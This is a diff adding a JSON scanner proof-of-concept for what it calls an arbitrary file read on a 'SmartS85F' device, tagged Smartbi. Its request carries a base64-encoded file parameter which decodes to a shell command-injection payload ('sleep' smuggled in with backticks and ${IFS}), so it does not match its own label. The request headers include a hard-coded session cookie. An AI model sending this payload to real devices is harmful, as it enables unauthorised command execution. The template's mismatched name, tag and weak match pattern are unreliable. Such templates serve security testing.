@@ -1,0 +1,24 @@
+{
+	"name":"SmartS85F任意文件读取",
+	"tag":"Smartbi",
+	"type":"other",
+	"poc":{
+		"pocGet":"/log/decodmail.php?file=L2V0Yy9gc2xlZXAke0lGU30xMGAucGNhcA==",
+		"header":{
+			"Cookie":" PHPSESSID=c36d5527fd784aa29748b3b1c50be7bc",
+			"Te":" trailers",
+			"Accept":" text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+			"Upgrade-Insecure-Requests":" 1",
+			"User-Agent":" Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv",
+			"Connection":" close",
+			"Sec-Fetch-Dest":" document",
+			"Sec-Fetch-Site":" none",
+			"Sec-Fetch-User":" ?1",
+			"Accept-Language":" zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
+			"Accept-Encoding":" gzip, deflate",
+			"Sec-Fetch-Mode":" navigate"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	}
+}
